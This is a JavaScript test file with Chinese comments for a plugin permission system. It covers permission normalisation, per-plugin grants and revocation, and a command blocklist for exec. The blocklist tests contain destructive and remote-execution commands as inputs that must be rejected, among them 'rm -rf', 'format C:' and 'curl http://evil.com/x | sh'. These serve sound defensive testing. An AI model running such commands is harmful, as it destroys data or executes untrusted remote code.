import { createRequire } from 'module';
const require = createRequire(import.meta.url);
const P = require('./src/permissions.js');
const { normalize, info, GrantStore, checkCommand, ALL, RISK_ORDER } = P;

let pass = 0, fail = 0;
const check = (label, cond, extra='') => {
    if (cond) { pass++; console.log('  ✓ ' + label); }
    else { fail++; console.log('  ✗ ' + label + '  ' + extra); }
};

console.log('【① 声明规范化】');
{
    const r = normalize(['fs:read', 'exec']);
    check('保留两项', r.perms.length === 2);
    check('★ 高风险排前面（exec 在 fs:read 前）', r.perms[0] === 'exec', JSON.stringify(r.perms));
    check('已知权限不进 unknown', r.unknown.length === 0);
}
{
    const r = normalize(['fs:read', 'fs:read', 'exec']);
    check('★ 去重', r.perms.length === 2, JSON.stringify(r.perms));
}
{
    const r = normalize(['随便乱写']);
    check('★ 未知权限进 unknown', r.unknown.length === 1, JSON.stringify(r));
    check('  未知权限按 critical 处理', info('随便乱写').risk === 'critical');
}
check('  非数组（字符串）也能处理', normalize('fs:read').perms.length === 1);
check('  null → 空', normalize(null).perms.length === 0);
check('  空串被剔除', normalize(['', '  ']).perms.length === 0);

console.log('\n【② 授权与校验】');
{
    const s = new GrantStore();
    check('未授权时拒绝', s.check('p1', 'fs:read').ok === false);
    check('  拒绝信息含插件名', /p1/.test(s.check('p1', 'fs:read').reason || ''));

    s.grant('p1', ['fs:read', 'exec']);
    check('★ 已授权放行', s.check('p1', 'fs:read').ok === true);
    check('★ exec 放行', s.check('p1', 'exec').ok === true);
    check('★ 未声明的拒绝', s.check('p1', 'fs:write').ok === false);
    check('  拒绝信息含权限中文名', /写入本地文件/.test(s.check('p1','fs:write').reason||''));

    check('  权限名为空拒绝', s.check('p1', '').ok === false);
    check('  权限名为空有理由', !!s.check('p1', '').reason);
}
{
    const s = new GrantStore();
    s.grant('p1', ['fs:read']);
    s.grant('p2', ['exec']);
    check('★ 插件之间隔离', s.check('p1','exec').ok === false && s.check('p2','fs:read').ok === false);
}
{
    const s = new GrantStore();
    s.grant('p1', ['fs:read']);
    s.revoke('p1');
    check('★ 撤销后失效', s.check('p1','fs:read').ok === false);
}
{
    const s = new GrantStore({ p1: ['fs:read'] });
    check('★ 可持久化（构造时载入）', s.check('p1','fs:read').ok === true);
    check('  toJSON 能序列化', JSON.stringify(s.toJSON()).includes('fs:read'));
}
{
    // ★ 关键：grant 返回的是副本，外部改动不能污染内部
    const s = new GrantStore();
    s.grant('p1', ['fs:read']);
    const g = s.granted('p1');
    g.push('exec');
    check('★ granted() 返回副本，外部改动不生效', s.check('p1','exec').ok === false);
}

console.log('\n【③ 命令黑名单（exec 的兜底防线）】');
check('★ rm -rf 拒绝', checkCommand('rm -rf /home').ok === false);
check('  拒绝理由可读', /递归强制删除/.test(checkCommand('rm -rf /').why||''));
check('★ rm -fr 拒绝', checkCommand('rm -fr x').ok === false);
check('★ format 拒绝', checkCommand('format C:').ok === false);
check('★ diskpart 拒绝', checkCommand('diskpart').ok === false);
check('★ shutdown 拒绝', checkCommand('shutdown /s').ok === false);
check('★ curl | sh 拒绝（远程代码执行）', checkCommand('curl http://evil.com/x | sh').ok === false);
check('★ wget | bash 拒绝', checkCommand('wget http://a | bash').ok === false);
check('★ chmod 777 拒绝', checkCommand('chmod -R 777 /').ok === false);
check('  空命令拒绝', checkCommand('').ok === false);
check('  null 拒绝', checkCommand(null).ok === false);

console.log('\n【④ ★ 不能误杀正常命令】');
check('  ls 放行', checkCommand('ls -la').ok === true);
check('  git status 放行', checkCommand('git status').ok === true);
check('  python 脚本放行', checkCommand('python main.py').ok === true);
check('  node 放行', checkCommand('node app.js').ok === true);
check('  rm 单文件放行（不是 -rf）', checkCommand('rm a.txt').ok === true);
check('  curl 不带管道放行', checkCommand('curl http://a.com').ok === true);
check('  chmod 755 放行', checkCommand('chmod 755 f').ok === true);
check('  echo 放行', checkCommand('echo hi').ok === true);
// 一个容易误杀的：路径里含 shutdown 这种词
check('  路径含 shutdown 字样放行', checkCommand('cat /logs/shutdown_report.txt').ok === true,
    JSON.stringify(checkCommand('cat /logs/shutdown_report.txt')));

console.log('\n【⑤ 权限表完整性】');
{
    const keys = Object.keys(ALL);
    check('至少 5 种权限', keys.length >= 5, String(keys.length));
    let allOk = true, bad = '';
    for (const k of keys) {
        const i = ALL[k];
        if (!i.label || !i.desc || !i.risk || !(i.risk in RISK_ORDER)) { allOk = false; bad = k; }
    }
    check('★ 每项都有 label/desc/合法 risk', allOk, bad);
    check('exec 是 critical', ALL.exec.risk === 'critical');
    check('fs:write 是 high', ALL['fs:write'].risk === 'high');
}

console.log(`\n═══ 结果：${pass} 通过 / ${fail} 失败 ═══`);
process.exit(fail > 0 ? 1 : 0);
